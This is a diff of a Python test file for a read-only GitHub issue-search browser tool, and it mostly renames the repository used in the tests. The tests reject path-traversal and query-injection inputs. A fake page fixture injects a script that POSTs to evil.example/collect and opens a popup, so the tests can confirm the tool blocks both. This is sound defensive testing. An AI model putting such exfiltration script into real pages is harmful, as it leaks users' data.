@@ -14,11 +14,11 @@ def test_issue_brief_rejects_unsafe_inputs_before_launch(tmp_path, monkeypatch):
     monkeypatch.setattr(issue_brief, "_start_browser", unexpected_playwright, raising=False)
     cancel = threading.Event()
     for repository, keyword, limit, run_id in [
-        ("wspotter/HoldMyBeer?x=1", "keyboard", 5, "run-1"),
-        ("wspotter/HoldMyBeer", "keyboard OR is:closed", 5, "run-1"),
-        ("wspotter/HoldMyBeer", "keyboard OR closed", 5, "run-1"),
-        ("wspotter/HoldMyBeer", "keyboard", 11, "run-1"),
-        ("wspotter/HoldMyBeer", "keyboard", 5, "../escape"),
+        ("wspotter/LikeThis?x=1", "keyboard", 5, "run-1"),
+        ("wspotter/LikeThis", "keyboard OR is:closed", 5, "run-1"),
+        ("wspotter/LikeThis", "keyboard OR closed", 5, "run-1"),
+        ("wspotter/LikeThis", "keyboard", 11, "run-1"),
+        ("wspotter/LikeThis", "keyboard", 5, "../escape"),
     ]:
         with pytest.raises(ValueError):
             issue_brief.execute_issue_brief(repository, keyword, limit, tmp_path, run_id, cancel)
@@ -26,24 +26,24 @@ def test_issue_brief_rejects_unsafe_inputs_before_launch(tmp_path, monkeypatch):
 
 def test_issue_brief_url_policy_is_exact_and_query_bounded():
     expected = "is:issue state:open keyboard-only"
-    allowed = "https://github.com/wspotter/HoldMyBeer/issues?q=is%3Aissue+state%3Aopen+keyboard-only"
-    assert issue_brief._allowed_issue_list_url(allowed, "wspotter/HoldMyBeer", expected)
-    assert not issue_brief._allowed_issue_list_url("http://github.com/wspotter/HoldMyBeer/issues", "wspotter/HoldMyBeer", expected)
-    assert not issue_brief._allowed_issue_list_url("https://github.com/other/HoldMyBeer/issues", "wspotter/HoldMyBeer", expected)
-    assert not issue_brief._allowed_issue_list_url("https://github.com/wspotter/HoldMyBeer/issues/4", "wspotter/HoldMyBeer", expected)
-    assert not issue_brief._allowed_issue_list_url(allowed + "&state=closed", "wspotter/HoldMyBeer", expected)
-    assert issue_brief.validate_inputs("wspotter/HoldMyBeer", "", 10) == (
-        "wspotter/HoldMyBeer", "", 10
+    allowed = "https://github.com/wspotter/LikeThis/issues?q=is%3Aissue+state%3Aopen+keyboard-only"
+    assert issue_brief._allowed_issue_list_url(allowed, "wspotter/LikeThis", expected)
+    assert not issue_brief._allowed_issue_list_url("http://github.com/wspotter/LikeThis/issues", "wspotter/LikeThis", expected)
+    assert not issue_brief._allowed_issue_list_url("https://github.com/other/LikeThis/issues", "wspotter/LikeThis", expected)
+    assert not issue_brief._allowed_issue_list_url("https://github.com/wspotter/LikeThis/issues/4", "wspotter/LikeThis", expected)
+    assert not issue_brief._allowed_issue_list_url(allowed + "&state=closed", "wspotter/LikeThis", expected)
+    assert issue_brief.validate_inputs("wspotter/LikeThis", "", 10) == (
+        "wspotter/LikeThis", "", 10
     )
     assert issue_brief._allowed_issue_list_url(
-        "https://github.com/wspotter/HoldMyBeer/issues?page=1&q=is%3Aissue+state%3Aopen+keyboard-only",
-        "wspotter/HoldMyBeer", expected, allow_page_parameter=True,
+        "https://github.com/wspotter/LikeThis/issues?page=1&q=is%3Aissue+state%3Aopen+keyboard-only",
+        "wspotter/LikeThis", expected, allow_page_parameter=True,
     )
     assert not issue_brief._is_expected_search_response_url(
-        "https://github.com/wspotter/HoldMyBeer/issues?q=is%3Aissue+state%3Aopen",
-        "wspotter/HoldMyBeer", expected,
+        "https://github.com/wspotter/LikeThis/issues?q=is%3Aissue+state%3Aopen",
+        "wspotter/LikeThis", expected,
     )
-    assert issue_brief._is_expected_search_response_url(allowed, "wspotter/HoldMyBeer", expected)
+    assert issue_brief._is_expected_search_response_url(allowed, "wspotter/LikeThis", expected)
 
 
 def _install_offline_github(monkeypatch, *, cancel_on_search=None, hostile_request=False, blank_query=False,
@@ -69,21 +69,21 @@ def _install_offline_github(monkeypatch, *, cancel_on_search=None, hostile_reque
             return
         if query == "is:issue state:open" and blank_query:
             body = """<!doctype html><main><input placeholder="Search issues">
-              <ul><li><a href="/wspotter/HoldMyBeer/issues/8">Open issue visible for the base query</a></li></ul></main>"""
+              <ul><li><a href="/wspotter/LikeThis/issues/8">Open issue visible for the base query</a></li></ul></main>"""
         elif query == "is:issue state:open":
             hostile = "fetch('https://evil.example/collect',{method:'POST'}).catch(()=>{});" if hostile_request else ""
             popup = "window.open('https://evil.example/popup');" if popup_on_search else ""
             body = """<!doctype html><main>
               <input placeholder="Search issues">
-              <ul id="results"><li><a href="/wspotter/HoldMyBeer/issues/99">Stale old result</a></li></ul>
+              <ul id="results"><li><a href="/wspotter/LikeThis/issues/99">Stale old result</a></li></ul>
               <script>
                 const input=document.querySelector('input');
                 HOSTILE
                 input.addEventListener('keydown',e=>{
                   if(e.key==='Enter') {
                     POPUP
-                    fetch('/wspotter/HoldMyBeer/issues?page=1&q='+encodeURIComponent(input.value));
-                    location.href='/wspotter/HoldMyBeer/issues?q='+encodeURIComponent(input.value);
+                    fetch('/wspotter/LikeThis/issues?page=1&q='+encodeURIComponent(input.value));
+                    location.href='/wspotter/LikeThis/issues?q='+encodeURIComponent(input.value);
                   }
                 });
               </script></main>""".replace("HOSTILE", hostile).replace("POPUP", popup)
@@ -94,10 +94,10 @@ def _install_offline_github(monkeypatch, *, cancel_on_search=None, hostile_reque
                 body = """<!doctype html><main>
                   <input placeholder="Search issues">
                   <ul id="results">
-                    <li><a href="/wspotter/HoldMyBeer/issues/4">Review the teaching interface with keyboard-only navigation</a><a href="/wspotter/HoldMyBeer/issues/4">#4</a></li>
-                    <li><a href="/wspotter/HoldMyBeer/issues/6">Build bounded visual teaching questions through Hermes</a></li>
+                    <li><a href="/wspotter/LikeThis/issues/4">Review the teaching interface with keyboard-only navigation</a><a href="/wspotter/LikeThis/issues/4">#4</a></li>
+                    <li><a href="/wspotter/LikeThis/issues/6">Build bounded visual teaching questions through Hermes</a></li>
                     <li><a href="/other/repo/issues/2">Wrong repository</a></li>
-                    <li><a href="/wspotter/HoldMyBeer/pull/3">Not an issue</a></li>
+                    <li><a href="/wspotter/LikeThis/pull/3">Not an issue</a></li>
                   </ul></main>"""
         else:
             body = "<!doctype html><main><p>Changed GitHub layout</p></main>"
@@ -140,16 +140,16 @@ def _install_offline_github(monkeypatch, *, cancel_on_search=None, hostile_reque
 def test_issue_brief_searches_rendered_public_results_and_retains_report(tmp_path, monkeypatch):
     requested, denied = _install_offline_github(monkeypatch)
     result = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "keyboard", 1, tmp_path, "run-2026", threading.Event()
+        "wspotter/LikeThis", "keyboard", 1, tmp_path, "run-2026", threading.Event()
     )
 
     assert result["status"] == "verified", result
     assert result["read_only"] is True
-    assert result["source_url"].startswith("https://github.com/wspotter/HoldMyBeer/issues?")
+    assert result["source_url"].startswith("https://github.com/wspotter/LikeThis/issues?")
     assert result["issues"] == [{
         "number": 4,
         "title": "Review the teaching interface with keyboard-only navigation",
-        "url": "https://github.com/wspotter/HoldMyBeer/issues/4",
+        "url": "https://github.com/wspotter/LikeThis/issues/4",
     }]
     assert result["truncated"] is True
     assert result["report_file"] == "run-2026-issues.json"
@@ -158,7 +158,7 @@ def test_issue_brief_searches_rendered_public_results_and_retains_report(tmp_pat
     assert report["issues"] == result["issues"]
     assert (tmp_path / result["screenshot_file"]).is_file()
     assert all(method in {"GET", "HEAD"} for method, _, _ in requested)
-    assert any("/wspotter/HoldMyBeer/issues?page=1&q=" in url for _, url, _ in requested)
+    assert any("/wspotter/LikeThis/issues?page=1&q=" in url for _, url, _ in requested)
     assert denied == []
 
 
@@ -168,7 +168,7 @@ def test_issue_brief_reports_explicit_empty_state_and_cooperative_cancel(tmp_pat
     # The fixture responds with an explicit empty state for this new query.
     monkeypatch.setattr(issue_brief, "SEARCH_SETTLE_MS", 120, raising=False)
     result = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "empty", 3, tmp_path, "empty-run", event
+        "wspotter/LikeThis", "empty", 3, tmp_path, "empty-run", event
     )
     assert result["status"] == "verified", result
     assert result["issues"] == []
@@ -179,7 +179,7 @@ def test_issue_brief_reports_explicit_empty_state_and_cooperative_cancel(tmp_pat
 def test_blank_keyword_uses_exact_initial_query_and_final_cancel_wins(tmp_path, monkeypatch):
     requested, _ = _install_offline_github(monkeypatch, blank_query=True)
     blank = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "", 3, tmp_path, "blank-run", threading.Event()
+        "wspotter/LikeThis", "", 3, tmp_path, "blank-run", threading.Event()
     )
     assert blank["status"] == "verified", blank
     assert blank["issues"][0]["number"] == 8
@@ -197,7 +197,7 @@ def test_blank_keyword_uses_exact_initial_query_and_final_cancel_wins(tmp_path, 
 
     monkeypatch.setattr(issue_brief, "_settled_results", cancel_after_settle)
     cancelled = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "keyboard", 3, tmp_path, "late-cancel", event
+        "wspotter/LikeThis", "keyboard", 3, tmp_path, "late-cancel", event
     )
     assert cancelled["status"] == "cancelled"
     assert cancelled["issues"] == []
@@ -206,7 +206,7 @@ def test_blank_keyword_uses_exact_initial_query_and_final_cancel_wins(tmp_path, 
 def test_popup_attempt_is_closed_and_stops_verified_result(tmp_path, monkeypatch):
     _install_offline_github(monkeypatch, popup_on_search=True)
     result = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "keyboard", 3, tmp_path, "popup-run", threading.Event()
+        "wspotter/LikeThis", "keyboard", 3, tmp_path, "popup-run", threading.Event()
     )
     assert result["status"] == "needs_teaching", result
     assert "popup" in result["failure"].lower()
@@ -223,7 +223,7 @@ def test_popup_attempt_is_closed_and_stops_verified_result(tmp_path, monkeypatch
 
     monkeypatch.setattr(issue_brief, "_cancelled", cancel_after_search)
     cancelled = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "cancel-me", 3, tmp_path, "cancel-run", cancel_event
+        "wspotter/LikeThis", "cancel-me", 3, tmp_path, "cancel-run", cancel_event
     )
     assert cancelled["status"] == "cancelled"
     assert cancelled["issues"] == []
@@ -233,7 +233,7 @@ def test_popup_attempt_is_closed_and_stops_verified_result(tmp_path, monkeypatch
 def test_issue_brief_aborts_external_post_and_reports_layout_change(tmp_path, monkeypatch):
     _, denied = _install_offline_github(monkeypatch, hostile_request=True)
     blocked = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "keyboard", 3, tmp_path, "blocked-run", threading.Event()
+        "wspotter/LikeThis", "keyboard", 3, tmp_path, "blocked-run", threading.Event()
     )
     assert blocked["status"] == "verified"
     assert blocked["read_only"] is True
@@ -242,7 +242,7 @@ def test_issue_brief_aborts_external_post_and_reports_layout_change(tmp_path, mo
     _install_offline_github(monkeypatch)
     monkeypatch.setattr(issue_brief, "DEADLINE_SECONDS", 2)
     changed = issue_brief.execute_issue_brief(
-        "wspotter/HoldMyBeer", "changed", 3, tmp_path, "changed-run", threading.Event()
+        "wspotter/LikeThis", "changed", 3, tmp_path, "changed-run", threading.Event()
     )
     assert changed["status"] == "needs_teaching"
     assert "did not settle" in changed["failure"]
